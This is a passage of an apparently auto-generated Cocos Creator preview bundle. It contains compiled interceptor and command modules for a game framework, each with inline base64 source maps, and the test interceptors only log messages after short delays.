pY2hUZXh0LmZvbnRTaXplID0gY29uZmlnLmZvbnRTaXplIHx8IDM4O1xyXG4gICAgICAgIHJpY2hUZXh0LnN0cmluZyA9IGNvbmZpZy5zdHJpbmc7XHJcbiAgICAgICAgcmljaFRleHQubGluZUhlaWdodCA9IHJpY2hUZXh0LmZvbnRTaXplICsgMTA7XHJcbiAgICAgICAgbm9kZS5zZXRDb250ZW50U2l6ZShyaWNoVGV4dC5ub2RlLndpZHRoICsgMzAsIHJpY2hUZXh0Lm5vZGUuaGVpZ2h0ICsgMjApO1xyXG4gICAgICAgIHJldHVybiBub2RlO1xyXG4gICAgfVxyXG5cclxuXHJcbiAgICBwdWJsaWMgc3RhdGljIGZsdXR0ZXIoY29uZmlnOlRvYXN0Q29uZmlnKXtcclxuICAgICAgICBsZXQgbm9kZSA9IHRoaXMuY3JlYXRlUmljaFRleHQoY29uZmlnKTtcclxuICAgICAgICBub2RlLnN0b3BBbGxBY3Rpb25zKCk7XHJcbiAgICAgICAgbm9kZS5ydW5BY3Rpb24oY2Muc2VxdWVuY2UoY2MuZGVsYXlUaW1lKDAuNiksIHRoaXMuZmx1dHRlckFjdGlvbigpLCBjYy5jYWxsRnVuYygoKT0+bm9kZS5kZXN0cm95KCkpKSk7XHJcbiAgICB9XHJcblxyXG4gICAgcHVibGljIHN0YXRpYyBmYWRlT3V0KGNvbmZpZzpUb2FzdENvbmZpZyl7XHJcbiAgICAgICAgbGV0IG5vZGUgPSB0aGlzLmNyZWF0ZVJpY2hUZXh0KGNvbmZpZyk7XHJcbiAgICAgICAgbm9kZS5zdG9wQWxsQWN0aW9ucygpO1xyXG4gICAgICAgIG5vZGUucnVuQWN0aW9uKGNjLnNlcXVlbmNlKGNjLmRlbGF5VGltZSgwLjgpLCBjYy5mYWRlVG8oMiwgODApLCBjYy5jYWxsRnVuYygoKT0+bm9kZS5kZXN0cm95KCkpKSk7XHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/interceptor/PreCommandInterceptor.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'a3b4dlTRDJMdKhqI+oAHol6', 'PreCommandInterceptor');
// framework/interceptor/PreCommandInterceptor.ts

Object.defineProperty(exports, "__esModule", { value: true });
exports.PreCommandInterceptor = void 0;
var PreCommandInterceptor = /** @class */ (function () {
    function PreCommandInterceptor() {
    }
    PreCommandInterceptor.prototype.postHandle = function (res) {
        var args = [];
        for (var _i = 1; _i < arguments.length; _i++) {
            args[_i - 1] = arguments[_i];
        }
        return __awaiter(this, void 0, Promise, function () {
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve) { return resolve(); })];
            });
        });
    };
    return PreCommandInterceptor;
}());
exports.PreCommandInterceptor = PreCommandInterceptor;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvaW50ZXJjZXB0b3IvUHJlQ29tbWFuZEludGVyY2VwdG9yLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7O0FBV0E7SUFBQTtJQU9BLENBQUM7SUFIUywwQ0FBVSxHQUFoQixVQUFpQixHQUFPO1FBQUUsY0FBTzthQUFQLFVBQU8sRUFBUCxxQkFBTyxFQUFQLElBQU87WUFBUCw2QkFBTzs7dUNBQUUsT0FBTzs7Z0JBQ3RDLHNCQUFPLElBQUksT0FBTyxDQUFDLFVBQUEsT0FBTyxJQUFJLE9BQUEsT0FBTyxFQUFFLEVBQVQsQ0FBUyxDQUFDLEVBQUM7OztLQUM1QztJQUNMLDRCQUFDO0FBQUQsQ0FQQSxBQU9DLElBQUE7QUFQcUIsc0RBQXFCIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiLy8gTGVhcm4gVHlwZVNjcmlwdDpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvdHlwZXNjcmlwdC5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvdHlwZXNjcmlwdC5odG1sXHJcbi8vIExlYXJuIEF0dHJpYnV0ZTpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvcmVmZXJlbmNlL2F0dHJpYnV0ZXMuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL3JlZmVyZW5jZS9hdHRyaWJ1dGVzLmh0bWxcclxuLy8gTGVhcm4gbGlmZS1jeWNsZSBjYWxsYmFja3M6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL2xpZmUtY3ljbGUtY2FsbGJhY2tzLmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy9saWZlLWN5Y2xlLWNhbGxiYWNrcy5odG1sXHJcbmltcG9ydCB7SUNvbW1hbmRJbnRlcmNlcHRvcn0gZnJvbSBcIi4vQ29tbWFuZEludGVyY2VwdG9yXCI7XHJcblxyXG5leHBvcnQgYWJzdHJhY3QgY2xhc3MgUHJlQ29tbWFuZEludGVyY2VwdG9yIGltcGxlbWVudHMgSUNvbW1hbmRJbnRlcmNlcHRvciB7XHJcblxyXG4gICAgYWJzdHJhY3QgYXN5bmMgcHJlSGFuZGxlKC4uLmFyZ3MpOlByb21pc2U8Ym9vbGVhbj47XHJcblxyXG4gICAgYXN5bmMgcG9zdEhhbmRsZShyZXM6YW55LCAuLi5hcmdzKTpQcm9taXNle1xyXG4gICAgICAgIHJldHVybiBuZXcgUHJvbWlzZShyZXNvbHZlID0+IHJlc29sdmUoKSk7XHJcbiAgICB9XHJcbn0iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/interceptor/TestInterceptor.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '15bb6OJyFFCL6LFRF9kunrS', 'TestInterceptor');
// framework/interceptor/TestInterceptor.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });
var PostCommandInterceptor_1 = require("./PostCommandInterceptor");
var Interceptor_1 = require("./Interceptor");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var TestInterceptor = /** @class */ (function (_super) {
    __extends(TestInterceptor, _super);
    function TestInterceptor() {
        return _super !== null && _super.apply(this, arguments) || this;
    }
    TestInterceptor.prototype.postHandle = function (res) {
        var args = [];
        for (var _i = 1; _i < arguments.length; _i++) {
            args[_i - 1] = arguments[_i];
        }
        return __awaiter(this, void 0, Promise, function () {
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve) {
                        setTimeout(function () {
                            console.log("postHandle");
                            resolve(true);
                        }, 3000);
                    })];
            });
        });
    };
    TestInterceptor.prototype.preHandle = function () {
        var args = [];
        for (var _i = 0; _i < arguments.length; _i++) {
            args[_i] = arguments[_i];
        }
        return __awaiter(this, void 0, Promise, function () {
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve) {
                        setTimeout(function () {
                            console.log(Interceptor_1.Interceptor.interceptorsOf("test.TestCommand"), "====");
                            Interceptor_1.Interceptor.unregister("test.TestCommand", TestInterceptor);
                            // InterceptorManager.unregister("test.TestCommand", TestInterceptor2);
                            console.log(Interceptor_1.Interceptor.interceptorsOf("test.TestCommand"), "====22");
                            resolve(true);
                        }, 3000);
                    })];
            });
        });
    };
    return TestInterceptor;
}(PostCommandInterceptor_1.PostCommandInterceptor));
exports.default = TestInterceptor;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvaW50ZXJjZXB0b3IvVGVzdEludGVyY2VwdG9yLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7OztBQUFBLG9CQUFvQjtBQUNwQixpRkFBaUY7QUFDakYseUZBQXlGO0FBQ3pGLG1CQUFtQjtBQUNuQiwyRkFBMkY7QUFDM0YsbUdBQW1HO0FBQ25HLDhCQUE4QjtBQUM5QiwyRkFBMkY7QUFDM0YsbUdBQW1HOztBQUluRyxtRUFBZ0U7QUFDaEUsNkNBQTBDO0FBRXBDLElBQUEsS0FBc0IsRUFBRSxDQUFDLFVBQVUsRUFBbEMsT0FBTyxhQUFBLEVBQUUsUUFBUSxjQUFpQixDQUFDO0FBRTFDO0lBQTZDLG1DQUFzQjtJQUFuRTs7SUFzQkEsQ0FBQztJQXBCUyxvQ0FBVSxHQUFoQixVQUFpQixHQUFPO1FBQUUsY0FBTzthQUFQLFVBQU8sRUFBUCxxQkFBTyxFQUFQLElBQU87WUFBUCw2QkFBTzs7dUNBQUUsT0FBTzs7Z0JBQ3RDLHNCQUFPLElBQUksT0FBTyxDQUFDLFVBQUEsT0FBTzt3QkFDdEIsVUFBVSxDQUFDOzRCQUNQLE9BQU8sQ0FBQyxHQUFHLENBQUMsWUFBWSxDQUFDLENBQUM7NEJBQzFCLE9BQU8sQ0FBQyxJQUFJLENBQUMsQ0FBQzt3QkFDbEIsQ0FBQyxFQUFFLElBQUksQ0FBQyxDQUFDO29CQUNiLENBQUMsQ0FBQyxFQUFDOzs7S0FDTjtJQUVLLG1DQUFTLEdBQWY7UUFBZ0IsY0FBTzthQUFQLFVBQU8sRUFBUCxxQkFBTyxFQUFQLElBQU87WUFBUCx5QkFBTzs7dUNBQUUsT0FBTzs7Z0JBQzVCLHNCQUFPLElBQUksT0FBTyxDQUFDLFVBQUEsT0FBTzt3QkFDdEIsVUFBVSxDQUFDOzRCQUNQLE9BQU8sQ0FBQyxHQUFHLENBQUMseUJBQVcsQ0FBQyxjQUFjLENBQUMsa0JBQWtCLENBQUMsRUFBRSxNQUFNLENBQUMsQ0FBQzs0QkFDcEUseUJBQVcsQ0FBQyxVQUFVLENBQUMsa0JBQWtCLEVBQUUsZUFBZSxDQUFDLENBQUM7NEJBQzVELHVFQUF1RTs0QkFDdkUsT0FBTyxDQUFDLEdBQUcsQ0FBQyx5QkFBVyxDQUFDLGNBQWMsQ0FBQyxrQkFBa0IsQ0FBQyxFQUFFLFFBQVEsQ0FBQyxDQUFDOzRCQUN0RSxPQUFPLENBQUMsSUFBSSxDQUFDLENBQUM7d0JBQ2xCLENBQUMsRUFBRSxJQUFJLENBQUMsQ0FBQztvQkFDYixDQUFDLENBQUMsRUFBQzs7O0tBQ047SUFDTCxzQkFBQztBQUFELENBdEJBLEFBc0JDLENBdEI0QywrQ0FBc0IsR0FzQmxFIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiLy8gTGVhcm4gVHlwZVNjcmlwdDpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvdHlwZXNjcmlwdC5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvdHlwZXNjcmlwdC5odG1sXHJcbi8vIExlYXJuIEF0dHJpYnV0ZTpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvcmVmZXJlbmNlL2F0dHJpYnV0ZXMuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL3JlZmVyZW5jZS9hdHRyaWJ1dGVzLmh0bWxcclxuLy8gTGVhcm4gbGlmZS1jeWNsZSBjYWxsYmFja3M6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL2xpZmUtY3ljbGUtY2FsbGJhY2tzLmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy9saWZlLWN5Y2xlLWNhbGxiYWNrcy5odG1sXHJcblxyXG5cclxuXHJcbmltcG9ydCB7UG9zdENvbW1hbmRJbnRlcmNlcHRvcn0gZnJvbSBcIi4vUG9zdENvbW1hbmRJbnRlcmNlcHRvclwiO1xyXG5pbXBvcnQge0ludGVyY2VwdG9yfSBmcm9tIFwiLi9JbnRlcmNlcHRvclwiO1xyXG5cclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBUZXN0SW50ZXJjZXB0b3IgZXh0ZW5kcyBQb3N0Q29tbWFuZEludGVyY2VwdG9yIHtcclxuXHJcbiAgICBhc3luYyBwb3N0SGFuZGxlKHJlczphbnksIC4uLmFyZ3MpOlByb21pc2V7XHJcbiAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlKHJlc29sdmUgPT4ge1xyXG4gICAgICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uICgpIHtcclxuICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKFwicG9zdEhhbmRsZVwiKTtcclxuICAgICAgICAgICAgICAgIHJlc29sdmUodHJ1ZSk7XHJcbiAgICAgICAgICAgIH0sIDMwMDApO1xyXG4gICAgICAgIH0pO1xyXG4gICAgfVxyXG5cclxuICAgIGFzeW5jIHByZUhhbmRsZSguLi5hcmdzKTpQcm9taXNle1xyXG4gICAgICAgIHJldHVybiBuZXcgUHJvbWlzZShyZXNvbHZlID0+IHtcclxuICAgICAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbiAoKSB7XHJcbiAgICAgICAgICAgICAgICBjb25zb2xlLmxvZyhJbnRlcmNlcHRvci5pbnRlcmNlcHRvcnNPZihcInRlc3QuVGVzdENvbW1hbmRcIiksIFwiPT09PVwiKTtcclxuICAgICAgICAgICAgICAgIEludGVyY2VwdG9yLnVucmVnaXN0ZXIoXCJ0ZXN0LlRlc3RDb21tYW5kXCIsIFRlc3RJbnRlcmNlcHRvcik7XHJcbiAgICAgICAgICAgICAgICAvLyBJbnRlcmNlcHRvck1hbmFnZXIudW5yZWdpc3RlcihcInRlc3QuVGVzdENvbW1hbmRcIiwgVGVzdEludGVyY2VwdG9yMik7XHJcbiAgICAgICAgICAgICAgICBjb25zb2xlLmxvZyhJbnRlcmNlcHRvci5pbnRlcmNlcHRvcnNPZihcInRlc3QuVGVzdENvbW1hbmRcIiksIFwiPT09PTIyXCIpO1xyXG4gICAgICAgICAgICAgICAgcmVzb2x2ZSh0cnVlKTtcclxuICAgICAgICAgICAgfSwgMzAwMCk7XHJcbiAgICAgICAgfSk7XHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/interceptor/TestInterceptor2.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '106578FBhpDPKHz51vWDn84', 'TestInterceptor2');
// framework/interceptor/TestInterceptor2.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });
exports.TestInterceptor2 = void 0;
var PostCommandInterceptor_1 = require("./PostCommandInterceptor");
var TestInterceptor2 = /** @class */ (function (_super) {
    __extends(TestInterceptor2, _super);
    function TestInterceptor2() {
        return _super !== null && _super.apply(this, arguments) || this;
    }
    TestInterceptor2.prototype.postHandle = function (res) {
        var args = [];
        for (var _i = 1; _i < arguments.length; _i++) {
            args[_i - 1] = arguments[_i];
        }
        return __awaiter(this, void 0, Promise, function () {
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve) {
                        setTimeout(function () {
                            console.log("postHandle  TestInterceptor2");
                            resolve(true);
                        }, 3000);
                    })];
            });
        });
    };
    TestInterceptor2.prototype.preHandle = function () {
        var args = [];
        for (var _i = 0; _i < arguments.length; _i++) {
            args[_i] = arguments[_i];
        }
        return __awaiter(this, void 0, Promise, function () {
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve) {
                        setTimeout(function () {
                            console.log("preHandle  TestInterceptor2");
                            resolve(true);
                        }, 3000);
                    })];
            });
        });
    };
    return TestInterceptor2;
}(PostCommandInterceptor_1.PostCommandInterceptor));
exports.TestInterceptor2 = TestInterceptor2;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvaW50ZXJjZXB0b3IvVGVzdEludGVyY2VwdG9yMi50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7QUFBQSxvQkFBb0I7QUFDcEIsaUZBQWlGO0FBQ2pGLHlGQUF5RjtBQUN6RixtQkFBbUI7QUFDbkIsMkZBQTJGO0FBQzNGLG1HQUFtRztBQUNuRyw4QkFBOEI7QUFDOUIsMkZBQTJGO0FBQzNGLG1HQUFtRzs7O0FBS25HLG1FQUFnRTtBQUVoRTtJQUFzQyxvQ0FBc0I7SUFBNUQ7O0lBbUJBLENBQUM7SUFsQlMscUNBQVUsR0FBaEIsVUFBaUIsR0FBTztRQUFFLGNBQU87YUFBUCxVQUFPLEVBQVAscUJBQU8sRUFBUCxJQUFPO1lBQVAsNkJBQU87O3VDQUFFLE9BQU87O2dCQUN0QyxzQkFBTyxJQUFJLE9BQU8sQ0FBQyxVQUFBLE9BQU87d0JBQ3RCLFVBQVUsQ0FBQzs0QkFDUCxPQUFPLENBQUMsR0FBRyxDQUFDLDhCQUE4QixDQUFDLENBQUM7NEJBQzVDLE9BQU8sQ0FBQyxJQUFJLENBQUMsQ0FBQzt3QkFDbEIsQ0FBQyxFQUFFLElBQUksQ0FBQyxDQUFDO29CQUNiLENBQUMsQ0FBQyxFQUFDOzs7S0FDTjtJQUVLLG9DQUFTLEdBQWY7UUFBZ0IsY0FBTzthQUFQLFVBQU8sRUFBUCxxQkFBTyxFQUFQLElBQU87WUFBUCx5QkFBTzs7dUNBQUUsT0FBTzs7Z0JBQzVCLHNCQUFPLElBQUksT0FBTyxDQUFDLFVBQUEsT0FBTzt3QkFDdEIsVUFBVSxDQUFDOzRCQUNQLE9BQU8sQ0FBQyxHQUFHLENBQUMsNkJBQTZCLENBQUMsQ0FBQzs0QkFDM0MsT0FBTyxDQUFDLElBQUksQ0FBQyxDQUFDO3dCQUNsQixDQUFDLEVBQUUsSUFBSSxDQUFDLENBQUM7b0JBQ2IsQ0FBQyxDQUFDLEVBQUM7OztLQUNOO0lBRUwsdUJBQUM7QUFBRCxDQW5CQSxBQW1CQyxDQW5CcUMsK0NBQXNCLEdBbUIzRDtBQW5CWSw0Q0FBZ0IiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyIvLyBMZWFybiBUeXBlU2NyaXB0OlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy90eXBlc2NyaXB0Lmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy90eXBlc2NyaXB0Lmh0bWxcclxuLy8gTGVhcm4gQXR0cmlidXRlOlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy9yZWZlcmVuY2UvYXR0cmlidXRlcy5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvcmVmZXJlbmNlL2F0dHJpYnV0ZXMuaHRtbFxyXG4vLyBMZWFybiBsaWZlLWN5Y2xlIGNhbGxiYWNrczpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvbGlmZS1jeWNsZS1jYWxsYmFja3MuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL2xpZmUtY3ljbGUtY2FsbGJhY2tzLmh0bWxcclxuXHJcblxyXG5cclxuXHJcbmltcG9ydCB7UG9zdENvbW1hbmRJbnRlcmNlcHRvcn0gZnJvbSBcIi4vUG9zdENvbW1hbmRJbnRlcmNlcHRvclwiO1xyXG5cclxuZXhwb3J0IGNsYXNzIFRlc3RJbnRlcmNlcHRvcjIgZXh0ZW5kcyBQb3N0Q29tbWFuZEludGVyY2VwdG9yIHtcclxuICAgIGFzeW5jIHBvc3RIYW5kbGUocmVzOmFueSwgLi4uYXJncyk6UHJvbWlzZXtcclxuICAgICAgICByZXR1cm4gbmV3IFByb21pc2UocmVzb2x2ZSA9PiB7XHJcbiAgICAgICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgY29uc29sZS5sb2coXCJwb3N0SGFuZGxlICBUZXN0SW50ZXJjZXB0b3IyXCIpO1xyXG4gICAgICAgICAgICAgICAgcmVzb2x2ZSh0cnVlKTtcclxuICAgICAgICAgICAgfSwgMzAwMCk7XHJcbiAgICAgICAgfSk7XHJcbiAgICB9XHJcblxyXG4gICAgYXN5bmMgcHJlSGFuZGxlKC4uLmFyZ3MpOlByb21pc2V7XHJcbiAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlKHJlc29sdmUgPT4ge1xyXG4gICAgICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uICgpIHtcclxuICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKFwicHJlSGFuZGxlICBUZXN0SW50ZXJjZXB0b3IyXCIpO1xyXG4gICAgICAgICAgICAgICAgcmVzb2x2ZSh0cnVlKTtcclxuICAgICAgICAgICAgfSwgMzAwMCk7XHJcbiAgICAgICAgfSk7XHJcbiAgICB9XHJcblxyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/facade/ICommand.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'f2c54BXBTlBn4fPXf6TacFb', 'ICommand');
// framework/facade/ICommand.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvZmFjYWRlL0lDb21tYW5kLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7OztBQUFBLG9CQUFvQjtBQUNwQixpRkFBaUY7QUFDakYseUZBQXlGO0FBQ3pGLG1CQUFtQjtBQUNuQiwyRkFBMkY7QUFDM0YsbUdBQW1HO0FBQ25HLDhCQUE4QjtBQUM5QiwyRkFBMkY7QUFDM0YsbUdBQW1HIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiLy8gTGVhcm4gVHlwZVNjcmlwdDpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvdHlwZXNjcmlwdC5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvdHlwZXNjcmlwdC5odG1sXHJcbi8vIExlYXJuIEF0dHJpYnV0ZTpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvcmVmZXJlbmNlL2F0dHJpYnV0ZXMuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL3JlZmVyZW5jZS9hdHRyaWJ1dGVzLmh0bWxcclxuLy8gTGVhcm4gbGlmZS1jeWNsZSBjYWxsYmFja3M6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL2xpZmUtY3ljbGUtY2FsbGJhY2tzLmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly9